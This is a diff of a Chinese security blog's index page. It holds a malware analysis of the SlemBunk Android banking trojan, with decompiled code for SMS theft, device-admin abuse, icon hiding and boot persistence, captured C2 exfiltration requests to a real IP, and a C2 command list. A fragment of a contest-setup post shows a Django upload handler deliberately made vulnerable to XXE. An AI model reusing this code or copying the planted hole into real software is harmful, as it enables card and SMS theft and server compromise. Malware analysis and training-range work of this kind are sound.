@@ -887,6 +887,186 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2016/04/01/SlemBunk木马浅析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="廖新喜">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xxlegend">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/04/01/SlemBunk木马浅析/" itemprop="url">
+                  SlemBunk木马浅析
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-04-01T15:38:36+08:00">
+                2016-04-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/木马/" itemprop="url" rel="index">
+                    <span itemprop="name">木马</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2016/04/01/SlemBunk木马浅析/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2016/04/01/SlemBunk木马浅析/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2016/04/01/SlemBunk木马浅析/" class="leancloud_visitors" data-flag-title="SlemBunk木马浅析">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>SlemBunk最初由FireEye发现，后来其他一些安全公司也相继发现，作者有幸拿到该样本，分析该木马发现其设计精妙绝伦，可在此基础上做进一步演变。该样本伪造成其他一些常用android应用，欺骗用户输入信用卡相关敏感信息，下面我们就一步步分析。</p>
+<p>#1 恶意行为 </p>
+<p>##1.1 控制锁屏行为<br>控制电源状态为PARTIAL_WAKE_LOCK，在这个状态下，即使关机，cpu也处在运行状态，直到代码主动释放。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>.onCreate();</div><div class="line">        <span class="keyword">this</span>.mWakeLock = <span class="keyword">this</span>. getSystemService(<span class="string">"power"</span> ).newWakeLock (<span class="number">1</span>, <span class="string">"MyWakeLock"</span> );  <span class="comment">// in PARTIAL_WAKE_LOCK mode regardless of the power off</span></div><div class="line">        <span class="keyword">this</span>.mWakeLock .acquire ();</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
+<p>##1.2 设备管理员权限<br>获取设备管理员权限，如果没有设备管理员则申请，它会弹出一个界面供用户确认，DEVICE_ADMIN是相应的组件，ADD_EXPLANTION给用户的解释说明<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line">public void checkDeviceAdmin() &#123;</div><div class="line">        ComponentName v0 = new ComponentName((( Context)this ), MyDeviceAdminReceiver.class );</div><div class="line">        if(!this .deviceManager. isAdminActive(v0)) &#123;</div><div class="line">            Intent v1 = new Intent( "android.app.action.ADD_DEVICE_ADMIN" );</div><div class="line">            v1. putExtra("android.app.extra.DEVICE_ADMIN" , ((Parcelable) v0));</div><div class="line">            v1. putExtra("android.app.extra.ADD_EXPLANATION" , "Get video codec access");</div><div class="line">            this.startActivity (v1 );</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">``` </div><div class="line">##1.3 隐藏图标</div><div class="line">等用户安装完该应用，激活设备管理权限之后，会隐藏图标,比较有意思的隐藏图标的代码有一小段隐藏代码，对于smali可能不好阅读，但是反编译成java之后，这代码就是小菜一碟。</div><div class="line">```java</div><div class="line">if(("3". equals("3")) || ( "3" .equals( "1" ))) &#123;</div><div class="line">            this.getPackageManager ().setComponentEnabledSetting (new ComponentName(((Context )this), Main</div><div class="line">                    . class), 2 , 1);</div><div class="line">``` </div><div class="line">##1.4 计划任务</div><div class="line"></div><div class="line">```java</div><div class="line">private void scheduleLaunch() &#123;</div><div class="line">        Calendar v0 = Calendar .getInstance ();</div><div class="line">        v0. add( 12, this .restartTimeMinutes);</div><div class="line">        Intent v1 = new Intent( "com.slempo.service.activities.HTMLStart" );</div><div class="line">        v1. putExtra("values" , this. getIntent().getStringExtra ("values"));</div><div class="line">        this.am .set (0, v0. getTimeInMillis(), PendingIntent.getBroadcast (((Context) this), 0 , v1 , 0));</div><div class="line">    &#125;</div><div class="line">``` </div><div class="line"></div><div class="line">##1.5获取运行的应用</div><div class="line">slembunk木马会根据当前正在运行的应用来决定是否启用信用卡欺骗页面</div><div class="line">```java</div><div class="line">    private String getTopRunning() &#123;</div><div class="line">        List v1 = this .getSystemService ("activity"). getRunningTasks(1 );</div><div class="line">        String v3 = !v1.isEmpty() ? v1.get(0 ).topActivity. getPackageName() : "" ;</div><div class="line">        return v3;</div><div class="line">    &#125;</div><div class="line">``` </div><div class="line">##1.6 获取短信记录</div><div class="line">```java</div><div class="line">public static String readMessagesFromDeviceDB (Context context) &#123;</div><div class="line">        Cursor v8;</div><div class="line">        Uri v1 = Uri .parse ("content://sms/inbox");</div><div class="line">        String[] v2 = new String[]&#123; "_id", "address" , "body", "date"&#125;;</div><div class="line">        JSONArray v12 = new JSONArray();</div><div class="line">        try &#123;</div><div class="line">            v8 = context.getContentResolver ().query (v1 , v2 , null, null, null );</div><div class="line">            if(v8 != null ) &#123;</div><div class="line">                if(!v8.moveToFirst ()) &#123;</div><div class="line">                    goto label_55 ;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                do &#123;</div><div class="line">                    String v6 = v8.getString(v8.getColumnIndex ("address"));</div><div class="line">                    String v7 = v8.getString(v8.getColumnIndex ("body"));</div><div class="line">                    String v9 = new SimpleDateFormat( "dd-MM-yyyy HH:mm:ss" , Locale.US ).format (new Date(</div><div class="line">                            Long.parseLong(v8.getString(v8.getColumnIndex ("date")))));</div><div class="line">                    JSONObject v13 = new JSONObject();</div><div class="line">                    v13. put( "from", v6);</div><div class="line">                    v13. put( "body", v7);</div><div class="line">                    v13. put( "date", v9);</div><div class="line">                    v12. put( v13);</div><div class="line">                    if(v8.moveToNext ()) &#123;</div><div class="line">                        continue;</div><div class="line">                    &#125;</div><div class="line"></div><div class="line">                    break;</div><div class="line">                &#125;</div><div class="line">                while(true );</div><div class="line">            &#125;</div><div class="line">        &#125;</div></pre></td></tr></table></figure></p>
+<p>##1.6获取电话号码<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">public static String getPhoneNumber(Context context ) &#123;</div><div class="line">        String v0 = context.getSystemService ("phone"). getLine1Number();</div><div class="line">        if(v0 == null || (v0. equals("" ))) &#123;</div><div class="line">            v0 = "";</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        return v0;</div><div class="line">    &#125;</div><div class="line">``` </div><div class="line"></div><div class="line">##1.7 获取DeviceID</div><div class="line">```java</div><div class="line">  public static String getDeviceId (Context context) &#123;</div><div class="line">        String v1;</div><div class="line">        String v0 = context.getSystemService ("phone"). getDeviceId();</div><div class="line">        if((v0.equals("" )) || v0 == null || (v0.equals("000000000000000" ))) &#123;</div><div class="line">            v0 = Settings$Secure.getString(context.getContentResolver (), "android_id" );</div><div class="line">            if(v0 != null &amp;&amp; !v0. equals("" )) &#123;</div><div class="line">                return v0;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            v0 = Build.SERIAL ;</div><div class="line">            if(v0 != null &amp;&amp; !v0. equals("" ) &amp;&amp; !v0. equalsIgnoreCase("unknown" )) &#123;</div><div class="line">                return v0;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            v1 = "not available";</div><div class="line">        &#125;</div><div class="line">        else &#123;</div><div class="line">            v1 = v0;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        return v1;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
+<p>##1.8 设置开机启动<br>木马会被设置成开机启动并且监听外部sd卡，当sd卡准备好之后也会被启动。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:enabled</span>=<span class="string">"true "</span> <span class="attr">android:exported</span>=<span class="string">" true"</span> <span class="attr">android:name</span>=<span class="string">".reiujdksmcoiwerj "</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.ACTION_EXTERNAL_APPLICATIONS_AVAILABLE "</span> /&gt;</span></div><div class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:enabled</span>=<span class="string">"true "</span> <span class="attr">android:exported</span>=<span class="string">" true"</span> <span class="attr">android:name</span>=<span class="string">".hujnkij8uijkjlmj "</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.BOOT_COMPLETED "</span> /&gt;</span></div><div class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>##1.9 监听短信<br>木马通过短信下发cc指令,从如下AndroidMenifest.xml部分文件可看出，木马对短信应用进行监听，并且权限高于系统短信应用。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt; <span class="attr">receiver</span> <span class="attr">android:enabled</span> =<span class="string">"true"</span> <span class="attr">android:exported</span>=<span class="string">"true "</span> <span class="attr">android:name</span>=<span class="string">".riejkmdcwepoksmieru "</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">intent-filter</span> <span class="attr">android:priority</span>=<span class="string">"999 "</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.provider.Telephony.SMS_RECEIVED "</span> /&gt;</span></div><div class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></div><div class="line">``` </div><div class="line">下面是recevier的onReceive方法：</div><div class="line">```java</div><div class="line">    public void onReceive(Context context, Intent intent ) &#123;</div><div class="line">        SharedPreferences v8 = context.getSharedPreferences ("AppPrefs", 0);</div><div class="line">        new HashSet ();</div><div class="line">        try &#123;</div><div class="line">            Object v1 = DATAWraper .deserialize (v8 .getString ("BLOCKED_NUMBERS", DATAWraper.serialize(</div><div class="line">                    new HashSet ())));</div><div class="line">        &#125;</div><div class="line">        catch(Exception v2 ) &#123;</div><div class="line">            v2. printStackTrace();</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        Map v3 = SendSMSRecevier .retrieveMessages (intent );</div><div class="line">        Iterator v10 = v3.keySet().iterator ();</div><div class="line">        while(v10.hasNext()) &#123;</div><div class="line">            Object v7 = v10.next();</div><div class="line">            CommandCenter v6 = new CommandCenter( v3. get( v7), "", context);</div><div class="line">            if(v6.processCommand ()) &#123;</div><div class="line">                this.abortBroadcast ();</div><div class="line">                continue;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            boolean v4 = v6.needToInterceptIncoming ();</div><div class="line">            boolean v5 = v6.needToListen ();</div><div class="line">            if(!v4 &amp;&amp; !((HashSet )v1 ).contains (v7 )) &#123;</div><div class="line">                if(!v5) &#123;</div><div class="line">                    continue;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                SendData.sendListenedIncomingSMS (context , v3 .get (v7 ), ((String)v7));</div><div class="line">                continue;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            SendData.sendInterceptedIncomingSMS (context , v3 .get (v7 ), ((String)v7));</div><div class="line">            this.abortBroadcast ();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">``` </div><div class="line"></div><div class="line">#2 木马工作流程</div><div class="line">木马在AndroidManifest.xml中监听了SMS_RECEIVED，ACTION_EXTERNAL_APPLICATIONS_AVAILABLE，BOOT_COMPLETED，DEVICE_ADMIN_ENABLED，com.slempo.service.activities.HTMLStart这五个action，同时注册了几个activity和一个service，除主activity外，其他都是一些欺骗页面，service则负责启动相应activity，请求设备管理权限等。下面简单看下代码流程：</div><div class="line">![][1]</div><div class="line">在main activity中会启动MainServiceStart服务，这个服务会启动三个线程周期性轮询，判断当前应用启动伪信用卡界面；请求deviceAdmin权限；判断指令启动相应的伪界面；发送电话，ime等敏感信息。发送敏感信息的请求如下：</div></pre></td></tr></table></figure></p>
+<p>POST / HTTP/1.1<br>Content-Length: 481<br>Content-Type: text/plain; charset=UTF-8<br>Host: 181.174.164.25:2080<br>Connection: Keep-Alive<br>User-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4)</p>
+<p>{“os”:”4.0.4”,”model”:”Unknown sdk”,”phone number”:”15555215554”,”apps”:[“com.android.gesture.builder”,”com.android.widgetpreview”,”com.example.android.apis”,”com.example.android.livecubes”,”com.example.android.softkeyboard”,”com.joeykrim.rootcheck”,”de.robv.android.xposed.installer”,”de.robv.android.xposed.installer.staticbusybox”,”eu.chainfire.supersu”,”org.slempo.service”],”imei”:”8f986e65d50f299a”,”client number”:”3”,”type”:”device info”,”operator”:”310260”,”country”:”US”}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div><div class="line">前面也说到了木马会根据当前正在运行的应用来决定是否启动伪信用卡页面，伪界面如下</div><div class="line">![添加信用卡][2]</div><div class="line">![添加详细信息][3]</div><div class="line">木马作者对上述用户信息做了严格校验，首先是信用卡信息必须合法，其次过期时间必须在2014到2020年之间，到了信用卡地址信息页面，对邮政编码和电话号码做了严格的关联，用户填完所有信息之后就会发送给c&amp;c主机，请求如下：</div></pre></td></tr></table></figure></p>
+<p>POST / HTTP/1.1<br>Content-Length: 401<br>Content-Type: text/plain; charset=UTF-8<br>Host: 181.174.164.25:2080<br>Connection: Keep-Alive<br>User-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4)</p>
+<p>{“data”:{“additional information”:{“old vbv password”:”123456”,”vbv password”:”qwerty”},”type”:”card information”,”card”:{“cvc”:”393”,”month”:”12”,”year”:”15”,”number”:”4024 0238 6573 0515”},”billing address”:{“date of birth”:”01.03.1990”,”phone number”:”212-925-2355”,”street address”:”dalianganjinzi”,”zip code”:”10002”,”phone prefix”:”+1”,”name on card”:”Zhanghua”}},”type”:”user data”,”code”:”-1”}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">附录 c&amp;c指令</div></pre></td></tr></table></figure></p>
+<p>CommandCenter.commands. add(“#intercept_sms_start”);<br>CommandCenter.commands .add (“#intercept_sms_stop”)<br>CommandCenter.commands .add (“#block_numbers”);<br>CommandCenter.commands .add (“#unblock_all_numbers”);<br>CommandCenter.commands .add (“#unblock_numbers”);<br>CommandCenter.commands .add (“#lock”);<br>CommandCenter.commands .add (“#unlock”);<br>CommandCenter.commands .add (“#send” + “_sms”);<br>CommandCenter.commands .add (“#forward” + “_calls”);<br>CommandCenter.commands .add (“#disable_forward_calls”);<br>CommandCenter.commands .add (“#control_number”);<br>CommandCenter.commands .add (“#update_html”);<br>CommandCenter.commands .add (“#show_html”);<br>CommandCenter.commands .add (“#wipe_data”);<br>```</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+    <! -- 添加微信图标 -->
+    
+      
+    
+    
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2016/04/01/基于mezzanine的攻防比赛环境搭建及XXE漏洞构造/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1050,186 +1230,6 @@ location /static {    #静态配置文件
 <p>解决了依赖问题，下面就是编码问题了：<br>django的登录认证：<br>./django/contrib/auth/views.py 在这里去掉修改密码的功能，注释掉password_change函数</p>
 <p>去掉重置密码链接：直接注释用注释url链接<br>编辑grappelli_safe/templates/registration/ 相关页面</p>
 <p>修改上传页面的逻辑处理，对于xml加上对entity的解释功能，这样就能导入一个xxe漏洞，修改filebrowser_safe/views.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_string</span><span class="params">(target)</span>:</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        result = target.decode(<span class="string">'utf8'</span>).encode(<span class="string">'utf8'</span>)</div><div class="line">        <span class="keyword">return</span> (<span class="number">1</span>,result)</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">pass</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        result = target.decode(<span class="string">'gbk'</span>).encode(<span class="string">'utf8'</span>)</div><div class="line">        <span class="keyword">return</span> (<span class="number">2</span>,result)</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">pass</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        result = target.decode(<span class="string">'gb2312'</span>).encode(<span class="string">'utf8'</span>)</div><div class="line">        <span class="keyword">return</span> (<span class="number">3</span>,result)</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">pass</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        result = target.decode(<span class="string">'utf16'</span>).encode(<span class="string">'utf8'</span>)</div><div class="line">        <span class="keyword">return</span> (<span class="number">4</span>,result)</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">pass</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        result = target.decode(<span class="string">'latin1'</span>).encode(<span class="string">'utf8'</span>)</div><div class="line">        <span class="keyword">return</span> (<span class="number">5</span>,result)</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">pass</span></div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="string">''</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">_upload_file</span><span class="params">(request)</span>:</span></div><div class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> filedata.chunks():</div><div class="line">                code_type, line = decode_string(line)</div><div class="line">                <span class="keyword">if</span> code_type != <span class="number">4</span> <span class="keyword">and</span> <span class="string">'ENTITY'</span> <span class="keyword">in</span> line:</div><div class="line">                    msg = _(<span class="string">'illegal xml, ENTITY found!!!!'</span>)</div><div class="line">                    <span class="keyword">return</span> HttpResponse(msg)</div><div class="line"></div><div class="line">            uploadedfile = default_storage.save(file_path, filedata)</div><div class="line">            <span class="keyword">if</span> default_storage.exists(file_path) <span class="keyword">and</span> file_path != uploadedfile:</div><div class="line">                default_storage.move(smart_text(uploadedfile), smart_text(file_path), allow_overwrite=<span class="keyword">True</span>)</div><div class="line">            <span class="keyword">if</span> file_path.lower().endswith(<span class="string">".xml"</span>):</div><div class="line">                <span class="keyword">from</span> lxml <span class="keyword">import</span> etree</div><div class="line">                <span class="keyword">try</span>:</div><div class="line">                    msg = _(<span class="string">'path:%s:%s:%s:%s'</span> %(uploadedfile, file_path,directory,type(filedata.chunks())))</div><div class="line">                    <span class="keyword">if</span> default_storage.exists(file_path):</div><div class="line">                        abs_path = smart_text(django_settings.MEDIA_ROOT + <span class="string">"/"</span> + file_path)</div><div class="line">                        tree = etree.parse(abs_path)</div><div class="line">                        tree.write(abs_path)</div><div class="line"><span class="comment">#                    return HttpResponse(msg)</span></div><div class="line">                <span class="keyword">except</span> Exception,e:</div><div class="line">                    msg = _(<span class="string">'IOERROR:%s'</span> %(e))</div><div class="line">                    <span class="keyword">return</span> HttpResponse(msg)</div></pre></td></tr></table></figure></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-    <! -- 添加微信图标 -->
-    
-      
-    
-    
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2016/04/01/SlemBunk木马浅析/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="廖新喜">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xxlegend">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/04/01/SlemBunk木马浅析/" itemprop="url">
-                  SlemBunk木马浅析
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-04-01T15:38:36+08:00">
-                2016-04-01
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/木马/" itemprop="url" rel="index">
-                    <span itemprop="name">木马</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2016/04/01/SlemBunk木马浅析/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2016/04/01/SlemBunk木马浅析/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-             <span id="/2016/04/01/SlemBunk木马浅析/" class="leancloud_visitors" data-flag-title="SlemBunk木马浅析">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>SlemBunk最初由FireEye发现，后来其他一些安全公司也相继发现，作者有幸拿到该样本，分析该木马发现其设计精妙绝伦，可在此基础上做进一步演变。该样本伪造成其他一些常用android应用，欺骗用户输入信用卡相关敏感信息，下面我们就一步步分析。</p>
-<p>#1 恶意行为 </p>
-<p>##1.1 控制锁屏行为<br>控制电源状态为PARTIAL_WAKE_LOCK，在这个状态下，即使关机，cpu也处在运行状态，直到代码主动释放。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>.onCreate();</div><div class="line">        <span class="keyword">this</span>.mWakeLock = <span class="keyword">this</span>. getSystemService(<span class="string">"power"</span> ).newWakeLock (<span class="number">1</span>, <span class="string">"MyWakeLock"</span> );  <span class="comment">// in PARTIAL_WAKE_LOCK mode regardless of the power off</span></div><div class="line">        <span class="keyword">this</span>.mWakeLock .acquire ();</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
